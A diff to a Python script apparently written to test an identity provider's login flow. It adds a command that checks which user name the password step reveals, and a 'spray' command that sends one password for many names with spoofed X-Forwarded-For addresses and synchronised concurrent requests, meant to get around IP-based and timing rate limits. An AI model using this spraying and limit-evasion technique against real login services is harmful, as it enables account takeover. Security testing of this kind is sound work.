@@ -99,6 +99,48 @@ def main():
         for t in threads:
             t.join()
         print(json.dumps(answers))
+    elif cmd == "shown":                      # shown <name>: the name the password step shows for it
+        s = session()
+        s.get(executor("default-authentication-flow"), timeout=30)
+        r = s.post(executor("default-authentication-flow"), json={"component": "ak-stage-identification",
+                                                                    "uid_field": args[0]}, timeout=30)
+        j = r.json()
+        print(json.dumps({"component": j.get("component", ""), "pending_user": j.get("pending_user")}))
+    elif cmd == "spray":                      # spray <first> <n> <prefix> <password>: names each from its own /64
+        # of one /48 (X-Forwarded-For: <prefix>:<i>::1): <first> one after another, then <n> at one moment.
+        first_n, n, prefix, pw = int(args[0]), int(args[1]), args[2], args[3]
+        for i in range(first_n):
+            s = session()
+            s.headers["X-Forwarded-For"] = "%s:%x::1" % (prefix, 0x1000 + i)
+            s.get(executor("default-authentication-flow"), timeout=30)
+            s.post(executor("default-authentication-flow"), json={"component": "ak-stage-identification",
+                                                                    "uid_field": "spray-first-%d" % i}, timeout=30)
+            password(s, pw)
+        ready = []
+        for i in range(n):
+            s = session()
+            s.headers["X-Forwarded-For"] = "%s:%x::1" % (prefix, i + 1)
+            s.get(executor("default-authentication-flow"), timeout=30)
+            r = s.post(executor("default-authentication-flow"), json={"component": "ak-stage-identification",
+                                                                        "uid_field": "spray-%d" % i}, timeout=30)
+            ready.append((s, outcome(r)))
+        answers = [None] * n
+        gate = threading.Barrier(n)
+
+        def fire(i):
+            s, first = ready[i]
+            if first["component"] != "ak-stage-password":
+                answers[i] = dict(first, step="name")
+                return
+            gate.wait()
+            answers[i] = password(s, pw)
+
+        threads = [threading.Thread(target=fire, args=(i,)) for i in range(n)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        print(json.dumps(answers))
     elif cmd == "code":                       # code <name> <password> <code>…: the code step, codes in turn
         name, pw, codes = args[0], args[1], args[2:]
         s, first = start(name)
